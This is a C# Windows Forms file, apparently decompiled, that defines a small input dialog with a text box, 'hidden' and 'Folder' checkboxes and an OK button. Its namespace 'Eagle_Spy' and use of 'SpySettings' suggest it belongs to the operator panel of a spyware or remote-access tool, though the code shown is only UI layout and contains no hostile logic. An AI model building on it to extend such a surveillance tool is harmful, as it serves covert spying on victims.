using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class inp : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("b_ok")]
	private DrakeUIButtonIcon _b_ok;

	private List<Rectangle> RectInputText0;

	internal Panel Panel1
	;

	[field: AccessedThroughProperty("LTitle")]
	internal Label LTitle
    ;
    [field: AccessedThroughProperty("BOXX")]
	internal Panel BOXX
    ;
    [field: AccessedThroughProperty("CheckHidden")]
	internal CheckBox CheckHidden
    ;

    [field: AccessedThroughProperty("CheckFolder")]
	internal CheckBox CheckFolder
    ;

	internal Timer TOpacity
	;

	[field: AccessedThroughProperty("InputText")]
	internal DrakeUITextBox InputText
    ;

	internal DrakeUIButtonIcon b_ok
	;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.BOXX = new System.Windows.Forms.Panel();
		this.CheckHidden = new System.Windows.Forms.CheckBox();
		this.CheckFolder = new System.Windows.Forms.CheckBox();
		this.LTitle = new System.Windows.Forms.Label();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.InputText = new DrakeUI.Framework.DrakeUITextBox();
		this.b_ok = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel1.SuspendLayout();
		this.BOXX.SuspendLayout();
		base.SuspendLayout();


        Panel1.Paint += new PaintEventHandler(Panel1_Paint);
        TOpacity.Tick += new EventHandler(TOpacity_Tick);
        b_ok.Click += new EventHandler(B_ok_Click_1);


























        this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.b_ok);
		this.Panel1.Controls.Add(this.InputText);
		this.Panel1.Controls.Add(this.BOXX);
		this.Panel1.Controls.Add(this.LTitle);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(576, 160);
		this.Panel1.TabIndex = 0;
		this.BOXX.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.BOXX.Controls.Add(this.CheckHidden);
		this.BOXX.Controls.Add(this.CheckFolder);
		this.BOXX.Location = new System.Drawing.Point(16, 117);
		this.BOXX.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.BOXX.Name = "BOXX";
		this.BOXX.Size = new System.Drawing.Size(435, 28);
		this.BOXX.TabIndex = 4;
		this.BOXX.Visible = false;
		this.CheckHidden.AutoSize = true;
		this.CheckHidden.Dock = System.Windows.Forms.DockStyle.Right;
		this.CheckHidden.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.CheckHidden.Location = new System.Drawing.Point(292, 0);
		this.CheckHidden.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.CheckHidden.Name = "CheckHidden";
		this.CheckHidden.Size = new System.Drawing.Size(73, 28);
		this.CheckHidden.TabIndex = 1;
		this.CheckHidden.Text = "hidden";
		this.CheckHidden.UseVisualStyleBackColor = true;
		this.CheckFolder.AutoSize = true;
		this.CheckFolder.Dock = System.Windows.Forms.DockStyle.Right;
		this.CheckFolder.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.CheckFolder.Location = new System.Drawing.Point(365, 0);
		this.CheckFolder.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.CheckFolder.Name = "CheckFolder";
		this.CheckFolder.Size = new System.Drawing.Size(70, 28);
		this.CheckFolder.TabIndex = 0;
		this.CheckFolder.Text = "Folder";
		this.CheckFolder.UseVisualStyleBackColor = true;
		this.LTitle.AutoSize = true;
		this.LTitle.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.LTitle.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.LTitle.Location = new System.Drawing.Point(16, 28);
		this.LTitle.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LTitle.Name = "LTitle";
		this.LTitle.Size = new System.Drawing.Size(42, 25);
		this.LTitle.TabIndex = 1;
		this.LTitle.Text = "null";
		this.TOpacity.Interval = 1;
		this.InputText.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.InputText.FillColor = System.Drawing.Color.Black;
		this.InputText.Font = new System.Drawing.Font("Calibri", 12f);
		this.InputText.ForeColor = System.Drawing.Color.White;
		this.InputText.Location = new System.Drawing.Point(19, 64);
		this.InputText.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.InputText.Maximum = 2147483647.0;
		this.InputText.Minimum = -2147483648.0;
		this.InputText.Name = "InputText";
		this.InputText.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.InputText.Radius = 10;
		this.InputText.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.InputText.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.InputText.Size = new System.Drawing.Size(541, 32);
		this.InputText.Style = DrakeUI.Framework.UIStyle.Custom;
		this.InputText.StyleCustomMode = true;
		this.InputText.TabIndex = 44;
		this.InputText.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.InputText.Watermark = "";
		this.b_ok.BackColor = System.Drawing.Color.Transparent;
		this.b_ok.Cursor = System.Windows.Forms.Cursors.Hand;
		this.b_ok.FillColor = System.Drawing.Color.Transparent;
		this.b_ok.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.b_ok.FillPressColor = System.Drawing.Color.Black;
		this.b_ok.FillSelectedColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.b_ok.Font = new System.Drawing.Font("Calibri", 12f);
		this.b_ok.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.b_ok.ForePressColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.b_ok.Location = new System.Drawing.Point(459, 117);
		this.b_ok.Margin = new System.Windows.Forms.Padding(4);
		this.b_ok.Name = "b_ok";
		this.b_ok.Radius = 10;
		this.b_ok.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.b_ok.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.b_ok.RectHoverColor = System.Drawing.Color.White;
		this.b_ok.RectPressColor = System.Drawing.Color.White;
		this.b_ok.RectSelectedColor = System.Drawing.Color.White;
		this.b_ok.Size = new System.Drawing.Size(105, 32);
		this.b_ok.Style = DrakeUI.Framework.UIStyle.Custom;
		this.b_ok.SymbolSize = 0;
		this.b_ok.TabIndex = 49;
		this.b_ok.Text = "OK";
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(576, 160);
		base.Controls.Add(this.Panel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "inp";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "inp";
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		this.BOXX.ResumeLayout(false);
		this.BOXX.PerformLayout();
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				CheckHidden.Text = Codes.Translate(CheckHidden.Text, "en", "zh");
				CheckFolder.Text = Codes.Translate(CheckFolder.Text, "en", "zh");
			}
		}
		else
		{
			CheckHidden.Text = Codes.Translate(CheckHidden.Text, "en", "ar");
			CheckFolder.Text = Codes.Translate(CheckFolder.Text, "en", "ar");
		}
	}

	public inp()
	{
		base.Load += inp_Load;
		RectInputText0 = new List<Rectangle>();
		InitializeComponent();
		Font = reso.f;
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	private void inp_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\12.ico");
		translateme();
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	private void b_ok_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.OK;
	}

	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (RectInputText0.Count <= 0)
			return;
		foreach (Rectangle item in RectInputText0)
		{
			if (item.Width > 0)
				e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), item);
		}
	}

	private void B_ok_Click_1(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.OK;
	}
}
